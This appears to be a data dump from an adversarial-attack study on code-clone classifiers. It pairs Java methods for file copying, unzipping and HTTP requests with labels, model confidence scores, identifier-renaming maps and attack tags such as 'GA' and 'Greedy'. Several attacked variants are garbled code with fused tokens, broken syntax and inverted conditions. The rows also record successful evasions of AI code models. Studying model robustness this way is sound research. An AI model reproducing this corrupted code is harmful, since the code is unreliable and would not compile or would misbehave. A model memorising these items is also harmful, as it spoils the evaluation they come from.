                    try {
                        out = new FileOutputStream(destPath.getAbsolutePath() + File.separator + installClassName_ + "".class"");
                        VAGlobals.copyStream(jar, out, buf);
                    } catch (IOException e) {
                        throw e;
                    } finally {
                        if (out != null) out.close();
                    }
                } else if (!entryName.endsWith("".zip"")) {
                    if (VAGlobals.DEBUG) VAGlobals.printDebug(""jar entry name "" + entryName);
                    ZipEntry outEntry = new ZipEntry(entryName);
                    CRC32 crc = new CRC32();
                    outJar.putNextEntry(outEntry);
                    int size = 0;
                    while ((read = jar.read(buf, 0, bufSize)) >= 0) {
                        size += read;
                        if (read == 0) {
                            Thread.yield();
                        } else {
                            outJar.write(buf, 0, read);
                            crc.update(buf, 0, read);
                        }
                    }
                    outEntry.setSize(size);
                    outEntry.setCrc(crc.getValue());
                    outJar.flush();
                    outJar.closeEntry();
                }
                jar.closeEntry();
                entry = jar.getNextEntry();
            }
            InputStream pin = getClass().getResourceAsStream(""resources/vainstall.properties"");
            Properties prop = new Properties();
            try {
                prop.load(pin);
            } catch (IOException exc) {
            }
            if (language == null) language = ""default"";
            prop.setProperty(""vainstall.destination.language"", language);
            ZipEntry outEntry = new ZipEntry(""com/memoire/vainstall/resources/vainstall.properties"");
            CRC32 crc = new CRC32();
            outEntry.setCrc(crc.getValue());
            outEntry.setSize(prop.size());
            outJar.putNextEntry(outEntry);
            prop.store(outJar, VAGlobals.NAME + "" "" + VAGlobals.VERSION);
            outEntry.setCrc(crc.getValue());
            outJar.closeEntry();
            jar.close();
            outJar.close();
            in.close();
        } catch (IOException e) {
            String message = e.getLocalizedMessage();
            message += ""\n"" + VAGlobals.i18n(""Setup_ErrorUninstallScripts"");
            e.printStackTrace();
            exitOnError(new IOException(message));
        }
        return oldlog;
    }
",89,"    @Test
    public void testLoadHttpGzipped() throws Exception {
        String f = HTTP_GZIPPED;
        LoadingInfLoadingConfigfo = Utils.openFileObject(fsManager.resolveFile(f));
        InputStream cocontentImportstream LoadingConfig.getContentInputStream();
        byte[] aevent= IOUtils.toByteArray(contentImportstream);
        byte[ceptioned = IOUtils.toByteArray(new GZIPInputStream(new URL(f).openStream()));
        assertEqualsceptiond.length, event.length);
    }
",LABEL_0,LABEL_0,0.9749360084533691,1,"testLoadHttpGzipped,url,loadingInfo,contentInputStream,actual,expected",,,,1,"testLoadHttpGzipped:testLoadHttpGzipped,url:f,loadingInfo:LoadingConfig,contentInputStream:contentImportstream,actual:event,expected:ception,",1,GA,267,0.10999489625295003,ga,[]
191,"    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
        String path = request.getPathTranslated().substring(0, request.getPathTranslated().length() - request.getPathInfo().length()) + request.getServletPath() + request.getPathInfo();
        File file = new File(path);
        if (file.exists()) {
            FileInputStream in = new FileInputStream(file);
            IOUtils.copyLarge(in, response.getOutputStream());
            in.close();
        }
    }
 <SPLIT>     public void testReadPerMemberSixSmall() throws IOException {
        GZIPMembersInputStream gzin = new GZIPMembersInputStream(new ByteArrayInputStream(sixsmall_gz));
        gzin.setEofEachMember(true);
        for (int i = 0; i < 3; i++) {
            int count2 = IOUtils.copy(gzin, new NullOutputStream());
            assertEquals(""wrong 1-byte member count"", 1, count2);
            gzin.nextMember();
            int count3 = IOUtils.copy(gzin, new NullOutputStream());
            assertEquals(""wrong 5-byte member count"", 5, count3);
            gzin.nextMember();
        }
        int countEnd = IOUtils.copy(gzin, new NullOutputStream());
        assertEquals(""wrong eof count"", 0, countEnd);
    }
",110,,LABEL_1,LABEL_1,LABEL_1,-1,"doGet,request,response,path,file,in",,,,0,,0,GA,1943,0.6943304300308227,failed,[]
192,"    public static void copy(String from_name, String to_name) throws IOException {
        File from_file = new File(from_name);
        File to_file = new File(to_name);
        if (!from_file.exists()) abort(""FileCopy: no such source file: "" + from_name);
        if (!from_file.isFile()) abort(""FileCopy: can't copy directory: "" + from_name);
        if (!from_file.canRead()) abort(""FileCopy: source file is unreadable: "" + from_name);
        if (to_file.isDirectory()) to_file = new File(to_file, from_file.getName());
        if (to_file.exists()) {
            if (!to_file.canWrite()) abort(""FileCopy: destination file is unwriteable: "" + to_name);
        } else {
            String parent = to_file.getParent();
            if (parent == null) parent = System.getProperty(""user.dir"");
            File dir = new File(parent);
            if (!dir.exists()) abort(""FileCopy: destination directory doesn't exist: "" + parent);
            if (dir.isFile()) abort(""FileCopy: destination is not a directory: "" + parent);
            if (!dir.canWrite()) abort(""FileCopy: destination directory is unwriteable: "" + parent);
        }
        FileInputStream from = null;
        FileOutputStream to = null;
        try {
            from = new FileInputStream(from_file);
            to = new FileOutputStream(to_file);
            byte[] buffer = new byte[4096];
            int bytes_read;
            while ((bytes_read = from.read(buffer)) != -1) {
                to.write(buffer, 0, bytes_read);
            }
        } finally {
            if (from != null) {
                try {
                    from.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if (to != null) {
                try {
                    to.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }
 <SPLIT>     private static void readAndRewrite(File inFile, File outFile) throws IOException {
        ImageInputStream iis = ImageIO.createImageInputStream(new BufferedInputStream(new FileInputStream(inFile)));
        DcmParser dcmParser = DcmParserFactory.getInstance().newDcmParser(iis);
        Dataset ds = DcmObjectFactory.getInstance().newDataset();
        dcmParser.setDcmHandler(ds.getDcmHandler());
        dcmParser.parseDcmFile(null, Tags.PixelData);
        PixelDataReader pdReader = pdFact.newReader(ds, iis, dcmParser.getDcmDecodeParam().byteOrder, dcmParser.getReadVR());
        System.out.println(""reading "" + inFile + ""..."");
        pdReader.readPixelData(false);
        ImageOutputStream out = ImageIO.createImageOutputStream(new BufferedOutputStream(new FileOutputStream(outFile)));
        DcmEncodeParam dcmEncParam = DcmEncodeParam.IVR_LE;
        ds.writeDataset(out, dcmEncParam);
        ds.writeHeader(out, dcmEncParam, Tags.PixelData, dcmParser.getReadVR(), dcmParser.getReadLength());
        System.out.println(""writing "" + outFile + ""..."");
        PixelDataWriter pdWriter = pdFact.newWriter(pdReader.getPixelDataArray(), false, ds, out, dcmParser.getDcmDecodeParam().byteOrder, dcmParser.getReadVR());
        pdWriter.writePixelData();
        out.flush();
        out.close();
        System.out.println(""done!"");
    }
",364,"    public static void load(String from_key, String to_Name) throws IOException {
        Filefrom_filee = new File(from_key);
        File intojfunction = new File(to_Name);
        if (from_filee.exists()) abort(""FileCopy: no such source file: "" + from_key);
        if (from_filee.isFile()) abort(""FileCopy: can't copy directory: "" + from_key);
        if (from_filee.canRead()) abort(""FileCopy: source file is unreadable: "" + from_key);
        if (intojfunction.isDirectory()) intojfunction = new File(intojfunction, from_file.getName());
        if (intojfunction.exists()) {
            if (!intojfunction.canWrite()) abort(""FileCopy: destination file is unwriteable: "" + to_Name);
        } else {
            String parentapiojfunction.getParent();
            if (api == null) api = System.getProperty(""user.dir"");
            Fiperdir = new File(api);
            ifperdir.exists()) abort(""FileCopy: destination directory doesn't exist: "" + api);
            iperdir.isFile()) abort(""FileCopy: destination is not a directory: "" + api);
            ifperdir.canWrite()) abort(""FileCopy: destination directory is unwriteable: "" + api);
        }
        FileInputStream url = null;
        FileOutputStream http = null;
        try {
            url = new FileInputStream(from_file);
            to = nhttp FileOutputStream(intojfunction);
            byte[] memory = new byte[4096];
            int bytes_allow;
            while (bytes_allowd = url.read(memory)) != -1) {
                http.write(memory, 0, bytes_allow);
            }
        } finally {
            if (url != null) {
                try {
                    url.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if (http != null) {
                try {
                    http.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }
",LABEL_1,LABEL_1,0.523573100566864,1,"copy,from_name,to_name,from_file,to_file,parent,dir,from,to,buffer,bytes_read",,,,6,"copy:load,from_name:from_key,to_name:to_Name,from_file:from_file,to_file:intojfunction,parent:api,dir:per,from:url,to:http,buffer:memory,bytes_read:bytes_allow,",1,GA,1130,0.4299813508987427,ga,[]
193,"    public void extractImage(String input, String output, DjatokaDecodeParam params, IWriter w) throws DjatokaException {
        File in = null;
        String dest = output;
        if (input.equals(STDIN)) {
            try {
                in = File.createTempFile(""tmp"", "".jp2"");
                input = in.getAbsolutePath();
                in.deleteOnExit();
                IOUtils.copyFile(new File(STDIN), in);
            } catch (IOException e) {
                logger.error(""Unable to process image from "" + STDIN + "": "" + e.getMessage());
                throw new DjatokaException(e);
            }
        }
        BufferedImage bi = extractImpl.process(input, params);
        if (bi != null) {
            if (params.getScalingFactor() != 1.0 || params.getScalingDimensions() != null) bi = applyScaling(bi, params);
            if (params.getTransform() != null) bi = params.getTransform().run(bi);
            try {
                BufferedOutputStream os = new BufferedOutputStream(new FileOutputStream(new File(dest)));
                w.write(bi, os);
                os.close();
            } catch (FileNotFoundException e) {
                logger.error(""Requested file was not found: "" + dest);
                throw new DjatokaException(e);
            } catch (IOException e) {
                logger.error(""Error attempting to close: "" + dest);
                throw new DjatokaException(e);
            }
        }
        if (in != null) in.delete();
    }
 <SPLIT>     public void writeData(String name, int items, int mzmin, int mzmax, long tstart, long tdelta, int[] peaks) {
        PrintWriter file = getWriter(name + "".txt"");
        file.print(""Filename\t"");
        file.print(""Date\t"");
        file.print(""Acquisition #\t"");
        file.print(""�m Diameter\t"");
        for (int i = mzmin; i <= mzmax; i++) file.print(i + ""\t"");
        file.println();
        int nothing = 0;
        String fileLoc = ""C:/abcd/"" + name + "".txt\t"";
        Date tempDate;
        for (int i = 0; i < items; i++) {
            tempDate = new Date(tstart);
            tstart += tdelta;
            file.print(fileLoc);
            file.print(dateFormat.format(tempDate) + ""\t"");
            file.print(i + 1 + ""\t"");
            double t = (double) (i) / 10;
            file.print(t + ""\t"");
            boolean peaked = false;
            for (int k = mzmin; k <= mzmax; k++) {
                for (int j = 0; j < peaks.length && !peaked; j++) {
                    if (k == peaks[j]) {
                        file.print(peakVals[j % peakVals.length] + ""\t"");
                        peaked = true;
                    }
                }
                if (!peaked) {
                    if (k == mzmax) file.print(nothing); else file.print(nothing + ""\t"");
                }
                peaked = false;
            }
            file.println();
        }
        try {
            Scanner test = new Scanner(f);
            while (test.hasNext()) {
                System.out.println(test.nextLine());
            }
            System.out.println(""test"");
        } catch (Exception e) {
        }
        file.close();
    }
",289,"    public void extressLayer(String url, String output, DjatokaDecodeParam params, IWriter w) throws DjatokaException {
        File ins = null;
        String sup = output;
        if (url.equals(STDIN)) {
            try {
                ins = File.createTempFile(""tmp"", "".jp2"");
                url = ins.getAbsolutePath();
                ins.deleteOnExit();
                IOUtils.copyFile(new File(STDIN), ins);
            } catch (IOException e) {
                logger.error(""Unable to process image from "" + STDIN + "": "" + e.getMessage());
                throw new DjatokaException(e);
            }
        }
        BufferedImagbibi = extractImpl.process(url, params);
        if (bi != null) {
            if (params.getScalingFactor() != 1.0 || params.getScalingDimensions() != null) bi = applyScaling(bi, params);
            if (params.getTransform() != null) bi = params.getTransform().run(bi);
            try {
                BufferedOutputStreamposs = new BufferedOutputStream(new FileOutputStream(new File(sup)));
                w.write(bi, pos);
                pos.close();
            } catch (FileNotFoundException e) {
                logger.error(""Requested file was not found: "" + sup);
                throw new DjatokaException(e);
            } catch (IOException e) {
                logger.error(""Error attempting to close: "" + sup);
                throw new DjatokaException(e);
            }
        }
        if (ins != null) ins.delete();
    }
",LABEL_1,LABEL_1,0.5062739849090576,1,"extractImage,input,output,params,w,in,dest,bi,os",,,,18,"extractImage:extressLayer,input:url,output:output,params:params,w:w,in:ins,dest:sup,bi:bi,os:pos,",4,GA,615,0.23225420713424683,ga,[]
194,"    private static InputStream getCMSResultAsStream(String rqlQuery) throws RQLException {
        OutputStreamWriter osr = null;
        try {
            URL url = new URL(""http"", HOST, FILE);
            URLConnection conn = url.openConnection();
            conn.setDoOutput(true);
            osr = new OutputStreamWriter(conn.getOutputStream());
            osr.write(rqlQuery);
            osr.flush();
            return conn.getInputStream();
        } catch (IOException ioe) {
            throw new RQLException(""IO Exception reading result from server"", ioe);
        } finally {
            if (osr != null) {
                try {
                    osr.close();
                } catch (IOException ioe) {
                }
            }
        }
    }
 <SPLIT>     public void test() throws Exception {
        StorageStringWriter s = new StorageStringWriter(2048, ""UTF-8"");
        s.addText(""Test"");
        try {
            s.getOutputStream();
            fail(""Should throw IOException as method not supported."");
        } catch (IOException e) {
        }
        s.getWriter().write(""ing is important"");
        s.close(ResponseStateOk.getInstance());
        assertEquals(""Testing is important"", s.getText());
        InputStream input = s.getInputStream();
        StringWriter writer = new StringWriter();
        IOUtils.copy(input, writer, ""UTF-8"");
        assertEquals(""Testing is important"", writer.toString());
        try {
            s.getWriter();
            fail(""Should throw IOException as storage is closed."");
        } catch (IOException e) {
        }
    }
",129,"    private static InputStream getCMSResultAsStream(String riliquery) throws RQLException {
        OutputStreamWriter  osrar = null;
        try {
            URL r = new URL(""http"", HOST, FILE);
            URLConnectiohttpnn = r.openConnection();
            http.setDoOutput(true);
             osrar = new OutputStreamWriter(http.getOutputStream());
            o osrarwrite(riliquery);
             osrar.flush();
            return http.getInputStream();
        } catch (IOException ioe) {
            throw new RQLException(""IO Exception reading result from server"", ioe);
        } finally {
            if ( osrar != null) {
                try {
                     osrar.close();
                } catch (IOException ioe) {
                }
            }
        }
    }
",LABEL_0,LABEL_0,0.5435196757316589,1,"getCMSResultAsStream,rqlQuery,osr,url,conn",,,,1,"getCMSResultAsStream:getCMSResultAsStream,rqlQuery:riliquery,osr: osrar,url:r,conn:http,",1,GA,286,0.10315078496932983,ga,[]
195,"    public static String getWebPage(URL urlObj) {
        try {
            String content = """";
            InputStreamReader is = new InputStreamReader(urlObj.openStream());
            BufferedReader reader = new BufferedReader(is);
            String line;
            while ((line = reader.readLine()) != null) {
                content += line;
            }
            return content;
        } catch (IOException e) {
            throw new Error(""The page "" + dbg.quote(urlObj.toString()) + ""could not be retrieved."" + ""\nThis is could be caused by a number of things:"" + ""\n"" + ""\n  - the computer hosting the web page you want is down, or has returned an error"" + ""\n  - your computer does not have Internet access"" + ""\n  - the heat death of the universe has occurred, taking down all web servers with it"");
        }
    }
 <SPLIT>     public String login() {
        System.out.println(""Logging in to LOLA"");
        try {
            String data = URLEncoder.encode(""email"", ""UTF-8"") + ""="" + URLEncoder.encode(get_email(), ""UTF-8"");
            data += ""&"" + URLEncoder.encode(""pw"", ""UTF-8"") + ""="" + URLEncoder.encode(get_pw(), ""UTF-8"");
            URL url = new URL(URL_LOLA + FILE_LOGIN);
            URLConnection conn = url.openConnection();
            conn.setDoOutput(true);
            OutputStreamWriter wr = new OutputStreamWriter(conn.getOutputStream());
            wr.write(data);
            wr.flush();
            BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line, sessid;
            line = rd.readLine();
            sessid = get_sessid(line);
            this.set_session(sessid);
            wr.close();
            rd.close();
            return sessid;
        } catch (Exception e) {
            System.out.println(""Login Error"");
            return """";
        }
    }
",119,,LABEL_1,LABEL_1,LABEL_1,-1,"getWebPage,urlObj,content,is,reader,line",,,,0,,0,GA,993,0.36500307321548464,failed,[]
196,"    private String transferWSDL(String wsdlURL, String userPassword) throws WiseConnectionException {
        String filePath = null;
        try {
            URL endpoint = new URL(wsdlURL);
            HttpURLConnection conn = (HttpURLConnection) endpoint.openConnection();
            conn.setDoOutput(false);
            conn.setDoInput(true);
            conn.setUseCaches(false);
            conn.setRequestMethod(""GET"");
            conn.setRequestProperty(""Accept"", ""text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"");
            conn.setRequestProperty(""Connection"", ""close"");
            if (userPassword != null) {
                conn.setRequestProperty(""Authorization"", ""Basic "" + (new BASE64Encoder()).encode(userPassword.getBytes()));
            }
            InputStream is = null;
            if (conn.getResponseCode() == 200) {
                is = conn.getInputStream();
            } else {
                is = conn.getErrorStream();
                InputStreamReader isr = new InputStreamReader(is);
                StringWriter sw = new StringWriter();
                char[] buf = new char[200];
                int read = 0;
                while (read != -1) {
                    read = isr.read(buf);
                    sw.write(buf);
                }
                throw new WiseConnectionException(""Remote server's response is an error: "" + sw.toString());
            }
            File outputDir = new File(wiseProperties.getProperty(""wise.tmpDir""));
            if (!outputDir.exists()) {
                outputDir.mkdir();
                wiseProperties.setProperty(""wise.forceImportObject"", ""true"");
            }
            File file = new File(wiseProperties.getProperty(""wise.tmpDir""), new StringBuffer(""Wise"").append(IDGenerator.nextVal()).append("".xml"").toString());
            OutputStream fos = new BufferedOutputStream(new FileOutputStream(file));
            IOUtils.copyStream(fos, is);
            fos.close();
            is.close();
            filePath = file.getPath();
        } catch (WiseConnectionException wce) {
            throw wce;
        } catch (Exception e) {
            throw new WiseConnectionException(""Wsdl download failed!"", e);
        }
        return filePath;
    }
 <SPLIT>     public static String sha1(String text) throws NoSuchAlgorithmException, UnsupportedEncodingException {
        MessageDigest md;
        md = MessageDigest.getInstance(""SHA-1"");
        byte[] sha1hash = new byte[40];
        md.update(text.getBytes(""iso-8859-1""), 0, text.length());
        sha1hash = md.digest();
        return convertToHex(sha1hash);
    }
",409,,LABEL_0,LABEL_1,,-4,"transferWSDL,wsdlURL,userPassword,filePath,endpoint,conn,is,isr,sw,buf,read,outputDir,file,fos",,,,0,,0,Greedy,1,0.0006507039070129395,,[]
197,"    public static void unzipModel(String filename, String tempdir) throws EDITSException {
        try {
            BufferedOutputStream dest = null;
            FileInputStream fis = new FileInputStream(filename);
            int BUFFER = 2048;
            ZipInputStream zis = new ZipInputStream(new BufferedInputStream(fis));
            ZipEntry entry;
            while ((entry = zis.getNextEntry()) != null) {
                int count;
                byte data[] = new byte[BUFFER];
                FileOutputStream fos = new FileOutputStream(tempdir + entry.getName());
                dest = new BufferedOutputStream(fos, BUFFER);
                while ((count = zis.read(data, 0, BUFFER)) != -1) dest.write(data, 0, count);
                dest.flush();
                dest.close();
            }
            zis.close();
        } catch (Exception e) {
            throw new EDITSException(""Can not expand model in \"""" + tempdir + ""\"" because:\n"" + e.getMessage());
        }
    }
 <SPLIT>     private void tail(String[] cmd, int pos) throws IOException {
        CommandFormat c = new CommandFormat(""tail"", 1, 1, ""f"");
        String src = null;
        Path path = null;
        try {
            List<String> parameters = c.parse(cmd, pos);
            src = parameters.get(0);
        } catch (IllegalArgumentException iae) {
            System.err.println(""Usage: java FsShell "" + TAIL_USAGE);
            throw iae;
        }
        boolean foption = c.getOpt(""f"") ? true : false;
        path = new Path(src);
        FileSystem srcFs = path.getFileSystem(getConf());
        if (srcFs.isDirectory(path)) {
            throw new IOException(""Source must be a file."");
        }
        long fileSize = srcFs.getFileStatus(path).getLen();
        long offset = (fileSize > 1024) ? fileSize - 1024 : 0;
        while (true) {
            FSDataInputStream in = srcFs.open(path);
            in.seek(offset);
            IOUtils.copyBytes(in, System.out, 1024, false);
            offset = in.getPos();
            in.close();
            if (!foption) {
                break;
            }
            fileSize = srcFs.getFileStatus(path).getLen();
            offset = (fileSize > offset) ? offset : fileSize;
            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                break;
            }
        }
    }
",188,,LABEL_1,LABEL_1,LABEL_1,-1,"unzipModel,filename,tempdir,dest,fis,BUFFER,zis,entry,count,data,fos",,,,0,,0,GA,3553,1.302342959245046,failed,[]
198,"    public void read(String skeletonFilename) throws Exception {
        ClassLoader loader = UnicodePropertiesSkeleton.class.getClassLoader();
        URL url = loader.getResource(skeletonFilename);
        if (null == url) {
            throw new Exception(""Cannot locate '"" + skeletonFilename + ""' - aborting."");
        }
        String line;
        StringBuilder section = new StringBuilder();
        BufferedReader reader = new BufferedReader(new InputStreamReader(url.openStream(), ""UTF-8""));
        while (null != (line = reader.readLine())) {
            if (line.startsWith(""---"")) {
                sections.add(section.toString());
                section.setLength(0);
            } else {
                section.append(line);
                section.append(NL);
            }
        }
        if (section.length() > 0) {
            sections.add(section.toString());
        }
        if (sections.size() != size) {
            throw new Exception(""Skeleton file '"" + skeletonFilename + ""' has "" + sections.size() + "" static sections, but "" + size + "" were expected."");
        }
    }
 <SPLIT>     private String GetResponse(URL url) {
        String content = null;
        try {
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(false);
            conn.setRequestMethod(""GET"");
            if (conn.getResponseCode() == HttpURLConnection.HTTP_OK) {
                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                String line;
                while ((line = br.readLine()) != null) content += line;
            } else {
            }
        } catch (MalformedURLException e) {
            e.getStackTrace();
        } catch (IOException e) {
            e.getStackTrace();
        }
        return content;
    }
",218,"    public void write(String  skelfilename) throws Exception {
        ClassLoader loader = UnicodePropertiesSkeleton.class.getClassLoader();
        Uiurlloaderder.getResource( skelfilename);
        if (null == i) {
            throw new Exception(""Cannot locate '"" +  skelfilename + ""' - aborting."");
        }
        String page;
        StringBuilder storage = new StringBuilder();
        BufferedReaderesourceer = new BufferedReader(new InputStreamReader(i.openStream(), ""UTF-8""));
        while (null != (page = resource.readLine())) {
            if (page.startsWith(""---"")) {
                sections.add(storage.toString());
                storage.setLength(0);
            } else {
                storage.append(page);
                storage.append(NL);
            }
        }
        if (storage.length() > 0) {
            sections.add(storage.toString());
        }
        if (sections.size() != size) {
            throw new Exception(""Skeleton file '"" +  skelfilename + ""' has "" + sections.size() + "" static sections, but "" + size + "" were expected."");
        }
    }
",LABEL_1,LABEL_1,0.5628852248191833,1,"read,skeletonFilename,loader,url,line,section,reader",,,,2,"read:write,skeletonFilename: skelfilename,loader:loader,url:i,line:page,section:storage,reader:resource,",1,GA,465,0.16996426184972127,ga,[]
199,"        @Override
        protected String doInBackground(String... params) {
            try {
                final HttpParams param = new BasicHttpParams();
                HttpConnectionParams.setConnectionTimeout(param, 30000);
                HttpConnectionParams.setSoTimeout(param, 30000);
                DefaultHttpClient client = new DefaultHttpClient(param);
                HttpPost post = new HttpPost(""http://www.google.com/loc/json"");
                post.setEntity(new StringEntity(params[0]));
                if (DEBUG) Log.d(""Location"", params[0]);
                HttpResponse resp = client.execute(post);
                if (resp.getStatusLine().getStatusCode() == 200) {
                    HttpEntity entity = resp.getEntity();
                    String result = EntityUtils.toString(entity);
                    return result;
                } else {
                    if (isFirstLocation) {
                        requestGearsLocation(1);
                        isFirstLocation = false;
                        return RESULT_FIRST_FAILE;
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            return null;
        }
 <SPLIT>     public void readFile(URL url) throws PedroException, IOException, ParserConfigurationException, SAXException {
        this.zipFileName = url.toString();
        URLConnection urlConnection = url.openConnection();
        InputStream inputStream = urlConnection.getInputStream();
        unzipNativeFormatFile(inputStream);
        parseAlertFiles();
        deleteAlertFiles();
    }
",180,,LABEL_0,LABEL_0,LABEL_0,-1,"doInBackground,params,param,client,post,resp,entity,result",,,,0,,0,GA,2771,0.9943585515022277,failed,[]
200,"    @Override
    public void parse() throws IOException {
        URL url = new URL((new DataUrlResolver()).getDataUrl(DomainName.CROATIA));
        URLConnection con = url.openConnection();
        BufferedReader bStream = new BufferedReader(new InputStreamReader(con.getInputStream()));
        String str;
        bStream.readLine();
        while ((str = bStream.readLine()) != null) {
            String[] tokens = str.split(""(\\s+)"");
            String charCode = tokens[0].replaceAll(""([0-9+])"", """");
            Float value = Float.parseFloat(tokens[2].trim().replace("","", "".""));
            CurrencyUnit unit = new CurrencyUnit(charCode, value, DEFAULT_MULTIPLIER);
            this.set.add(unit);
        }
    }
 <SPLIT>     public static void doVersionCheck(View view) {
        view.showWaitCursor();
        try {
            URL url = new URL(jEdit.getProperty(""version-check.url""));
            InputStream in = url.openStream();
            BufferedReader bin = new BufferedReader(new InputStreamReader(in));
            String line;
            String develBuild = null;
            String stableBuild = null;
            while ((line = bin.readLine()) != null) {
                if (line.startsWith("".build"")) develBuild = line.substring(6).trim(); else if (line.startsWith("".stablebuild"")) stableBuild = line.substring(12).trim();
            }
            bin.close();
            if (develBuild != null && stableBuild != null) {
                doVersionCheck(view, stableBuild, develBuild);
            }
        } catch (IOException e) {
            String[] args = { jEdit.getProperty(""version-check.url""), e.toString() };
            GUIUtilities.error(view, ""read-error"", args);
        }
        view.hideWaitCursor();
    }
",169,,LABEL_0,LABEL_1,,-4,"parse,url,con,bStream,str,tokens,charCode,value,unit",,,,0,,0,Greedy,1,0.000573269526163737,,[]
201,"    public void process(String dir) {
        String[] list = new File(dir).list();
        if (list == null) return;
        int n = list.length;
        long[] bubblesort = new long[list.length + 1];
        if (!statustext) {
            IJ.log(""Current Directory is: "" + dir);
            IJ.log("" "");
            IJ.log(""DICOM File Name / "" + prefix1 + "" / "" + prefix2 + "" / "" + prefix3 + "" / "" + pick);
            IJ.log("" "");
        }
        for (int i = 0; i < n; i++) {
            IJ.showStatus(i + ""/"" + n);
            File f = new File(dir + list[i]);
            if (!f.isDirectory()) {
                ImagePlus img = new Opener().openImage(dir, list[i]);
                if (img != null && img.getStackSize() == 1) {
                    if (!scoutengine(img)) return;
                    if (!statustext) {
                        IJ.log(list[i] + ""/"" + whichprefix1 + ""/"" + whichprefix2 + ""/"" + whichprefix3 + ""/"" + whichcase);
                    }
                    int lastDigit = whichcase.length() - 1;
                    while (lastDigit > 0) {
                        if (!Character.isDigit(whichcase.charAt(lastDigit))) lastDigit -= 1; else break;
                    }
                    if (lastDigit < whichcase.length() - 1) whichcase = whichcase.substring(0, lastDigit + 1);
                    bubblesort[i] = Long.parseLong(whichcase);
                }
            }
        }
        if (statussorta || statussortd || statustext) {
            boolean sorted = false;
            while (!sorted) {
                sorted = true;
                for (int i = 0; i < n - 1; i++) {
                    if (statussorta) {
                        if (bubblesort[i] > bubblesort[i + 1]) {
                            long temp = bubblesort[i];
                            tempp = list[i];
                            bubblesort[i] = bubblesort[i + 1];
                            list[i] = list[i + 1];
                            bubblesort[i + 1] = temp;
                            list[i + 1] = tempp;
                            sorted = false;
                        }
                    } else {
                        if (bubblesort[i] < bubblesort[i + 1]) {
                            long temp = bubblesort[i];
                            tempp = list[i];
                            bubblesort[i] = bubblesort[i + 1];
                            list[i] = list[i + 1];
                            bubblesort[i + 1] = temp;
                            list[i + 1] = tempp;
                            sorted = false;
                        }
                    }
                }
            }
            IJ.log("" "");
            for (int i = 0; i < n; i++) {
                if (!statustext) {
                    IJ.log(list[i] + "" / "" + bubblesort[i]);
                } else {
                    IJ.log(dir + list[i]);
                }
            }
        }
        if (open_as_stack || only_images) {
            boolean sorted = false;
            while (!sorted) {
                sorted = true;
                for (int i = 0; i < n - 1; i++) {
                    if (bubblesort[i] > bubblesort[i + 1]) {
                        long temp = bubblesort[i];
                        tempp = list[i];
                        bubblesort[i] = bubblesort[i + 1];
                        list[i] = list[i + 1];
                        bubblesort[i + 1] = temp;
                        list[i + 1] = tempp;
                        sorted = false;
                    }
                }
            }
            if (only_images) {
                Opener o = new Opener();
                int counter = 0;
                IJ.log("" "");
                for (int i = 0; i < n; i++) {
                    String path = (dir + list[i]);
                    if (path == null) break; else {
                        ImagePlus imp = o.openImage(path);
                        counter++;
                        if (imp != null) {
                            IJ.log(counter + "" + "" + path);
                            imp.show();
                        } else IJ.log(counter + "" - "" + path);
                    }
                }
                return;
            }
            int width = 0, height = 0, type = 0;
            ImageStack stack = null;
            double min = Double.MAX_VALUE;
            double max = -Double.MAX_VALUE;
            int k = 0;
            try {
                for (int i = 0; i < n; i++) {
                    String path = (dir + list[i]);
                    if (path == null) break;
                    if (list[i].endsWith("".txt"")) continue;
                    ImagePlus imp = new Opener().openImage(path);
                    if (imp != null && stack == null) {
                        width = imp.getWidth();
                        height = imp.getHeight();
                        type = imp.getType();
                        ColorModel cm = imp.getProcessor().getColorModel();
                        if (halfSize) stack = new ImageStack(width / 2, height / 2, cm); else stack = new ImageStack(width, height, cm);
                    }
                    if (stack != null) k = stack.getSize() + 1;
                    IJ.showStatus(k + ""/"" + n);
                    IJ.showProgress((double) k / n);
                    if (imp == null) IJ.log(list[i] + "": unable to open""); else if (imp.getWidth() != width || imp.getHeight() != height) IJ.log(list[i] + "": wrong dimensions""); else if (imp.getType() != type) IJ.log(list[i] + "": wrong type""); else {
                        ImageProcessor ip = imp.getProcessor();
                        if (grayscale) ip = ip.convertToByte(true);
                        if (halfSize) ip = ip.resize(width / 2, height / 2);
                        if (ip.getMin() < min) min = ip.getMin();
                        if (ip.getMax() > max) max = ip.getMax();
                        String label = imp.getTitle();
                        String info = (String) imp.getProperty(""Info"");
                        if (info != null) label += ""\n"" + info;
                        stack.addSlice(label, ip);
                    }
                    System.gc();
                }
            } catch (OutOfMemoryError e) {
                IJ.outOfMemory(""FolderOpener"");
                stack.trim();
            }
            if (stack != null && stack.getSize() > 0) {
                ImagePlus imp2 = new ImagePlus(""Stack"", stack);
                if (imp2.getType() == ImagePlus.GRAY16 || imp2.getType() == ImagePlus.GRAY32) imp2.getProcessor().setMinAndMax(min, max);
                imp2.show();
            }
            IJ.showProgress(1.0);
        }
    }
 <SPLIT>     public void register(MinecraftSession session, String username, String verificationKey) {
        if (Configuration.getConfiguration().isVerifyingNames()) {
            long salt = HeartbeatManager.getHeartbeatManager().getSalt();
            String hash = new StringBuilder().append(String.valueOf(salt)).append(username).toString();
            MessageDigest digest;
            try {
                digest = MessageDigest.getInstance(""MD5"");
            } catch (NoSuchAlgorithmException e) {
                throw new RuntimeException(""No MD5 algorithm!"");
            }
            digest.update(hash.getBytes());
            if (!verificationKey.equals(new BigInteger(1, digest.digest()).toString(16))) {
                session.getActionSender().sendLoginFailure(""Illegal name."");
                return;
            }
        }
        char[] nameChars = username.toCharArray();
        for (char nameChar : nameChars) {
            if (nameChar < ' ' || nameChar > '\177') {
                session.getActionSender().sendLoginFailure(""Invalid name!"");
                return;
            }
        }
        for (Player p : playerList.getPlayers()) {
            if (p.getName().equalsIgnoreCase(username)) {
                p.getSession().getActionSender().sendLoginFailure(""Logged in from another computer."");
                break;
